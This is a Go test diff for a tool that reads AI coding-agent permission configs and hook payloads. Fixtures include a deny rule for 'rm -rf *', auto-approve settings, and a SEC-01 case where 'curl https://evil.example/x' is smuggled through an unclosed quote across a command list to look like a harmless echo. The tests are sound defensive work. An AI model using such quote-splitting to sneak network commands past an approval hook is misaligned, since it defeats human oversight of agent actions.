@@ -380,3 +380,67 @@ func TestDiscoverRegressionFixes(t *testing.T) {
 		t.Errorf("expected silent nudge when all host rules are synced/non-actionable, got: %q", silentNudge)
 	}
 }
+
+func TestDiscoverExtendedHarnessesAndPayloadEdgeCases(t *testing.T) {
+	home, _ := withFakeHome(t)
+	repo := filepath.Join(home, "repo")
+	if err := os.MkdirAll(filepath.Join(repo, ".git"), 0755); err != nil {
+		t.Fatal(err)
+	}
+
+	// Qwen settings + Goose config + Amp settings + Muse approval-policy
+	mustWrite := func(rel, content string) {
+		p := filepath.Join(home, rel)
+		if err := os.MkdirAll(filepath.Dir(p), 0755); err != nil {
+			t.Fatal(err)
+		}
+		if err := os.WriteFile(p, []byte(content), 0600); err != nil {
+			t.Fatal(err)
+		}
+	}
+	mustWrite(".qwen/settings.json", `{"approvalMode":"yolo","permissions":{"allow":["Bash(git status *)"]}}`)
+	mustWrite(".config/goose/config.yaml", "GOOSE_MODEL: gpt-4o\n")
+	mustWrite(".config/amp/settings.json", `{"amp.dangerouslyAllowAll":true,"amp.permissions":[{"tool":"Bash","action":"reject","matches":{"cmd":"rm -rf *"}}]}`)
+	mustWrite(".config/muse/approval-policy.json", `{"rules":[{"effect":"allow","rule":{"kind":"shell_command_argv_prefix","argv_prefix":["cargo","test"]}}]}`)
+
+	summary := DiscoverHostPermissions(repo)
+	foundQwenRule := false
+	foundAmpRule := false
+	foundMuseRule := false
+	for _, f := range summary.HostFiles {
+		if f.Harness == "goose" && len(f.PolicyAlerts) > 0 {
+			t.Errorf("expected Goose config without GOOSE_MODE: auto not to emit alert, got %+v", f.PolicyAlerts)
+		}
+		for _, r := range f.Rules {
+			if f.Harness == "qwen" && r.SuggestedRule == "allow-cmd git status *" {
+				foundQwenRule = true
+			}
+			if f.Harness == "amp" && r.SuggestedRule == "deny-cmd rm -rf *" {
+				foundAmpRule = true
+			}
+			if f.Harness == "muse" && r.SuggestedRule == "allow-cmd cargo test *" {
+				foundMuseRule = true
+			}
+		}
+	}
+	if !foundQwenRule || !foundAmpRule || !foundMuseRule {
+		t.Errorf("missing expected extended harness rules: qwen=%v amp=%v muse=%v", foundQwenRule, foundAmpRule, foundMuseRule)
+	}
+
+	// SEC-01: empty command must not shadow commands[], and unclosed quote in commands[0] must not parse as single safe echo.
+	p, err := parseFlexibleHookPayload([]byte(`{"hook_event_name":"PreToolUse","tool_name":"run_commands","tool_input":{"command":"","commands":["echo '","curl https://evil.example/x","'"]}}`))
+	if err != nil {
+		t.Fatal(err)
+	}
+	cmd, _ := p.ToolInput["command"].(string)
+	if !strings.Contains(cmd, "curl https://evil.example/x") || !strings.HasSuffix(cmd, "\n;;") {
+		t.Errorf("expected unclosed-quote commands[] to preserve curl and append syntax guard, got %q", cmd)
+	}
+
+	// SEC-05: ProjectSessionID must stay within IsValidSessionID limit (<=128 chars) even for 125-char session IDs.
+	longSID := strings.Repeat("a", 125)
+	projSID := ProjectSessionID(longSID, repo)
+	if !IsValidSessionID(projSID) {
+		t.Errorf("expected ProjectSessionID(%d chars) to remain valid (<=128 chars), got len=%d (%q)", len(longSID), len(projSID), projSID)
+	}
+}
